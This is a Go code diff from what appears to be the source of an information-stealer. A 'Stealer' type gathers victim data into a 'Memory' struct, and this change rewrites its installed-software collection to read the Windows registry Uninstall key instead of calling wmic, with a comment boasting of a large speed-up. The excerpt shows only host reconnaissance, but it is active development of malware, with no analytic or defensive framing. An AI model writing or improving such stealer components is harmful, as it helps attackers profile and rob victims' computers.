@@ -6,8 +6,8 @@
 package main
 
 import (
-	"os/exec"
-	"strings"
+	"time"
+	"golang.org/x/sys/windows/registry"
 )
 
 type Memory struct {
@@ -19,21 +19,36 @@ type Memory struct {
 	Files             Files
 }
 
-// Need to rewrite as it takes too long to parse and increases runtime considerably
+// Newly rewritten, improved function runtime from 12s to 2ms (!)
 func (stealer *Stealer) GetInstalledSoftware() {
-	// Executing the wmic command to get list of installed software
-	out, err := exec.Command("wmic", "product", "get", "name").Output()
+	defer TimeTrack(time.Now())
+
+	// Open the registry key that contains information about installed software
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
+	if err != nil {
+		return
+	}
+	defer key.Close()
+
+	// Get the list of subkeys (i.e., installed software)
+	subkeyNames, err := key.ReadSubKeyNames(-1)
 	if err != nil {
 		return
 	}
 
-	// Parsing out the list of installed software from the wmic output
-	for _, line := range strings.Split(string(out[:]), "\n") {
+	// Add each subkey name to the list of installed software
+	for _, subkeyName := range subkeyNames {
+		subkey, err := registry.OpenKey(key, subkeyName, registry.QUERY_VALUE)
+		if err != nil {
+			continue
+		}
+		defer subkey.Close()
 
-		if line == "" || strings.TrimSpace(line) == "" {
+		displayName, _, err := subkey.GetStringValue("DisplayName")
+		if err != nil || displayName == "" {
 			continue
 		}
 
-		stealer.Memory.InstalledSoftware = append(stealer.Memory.InstalledSoftware, strings.TrimSpace(line))
+		stealer.Memory.InstalledSoftware = append(stealer.Memory.InstalledSoftware, displayName)
 	}
 }
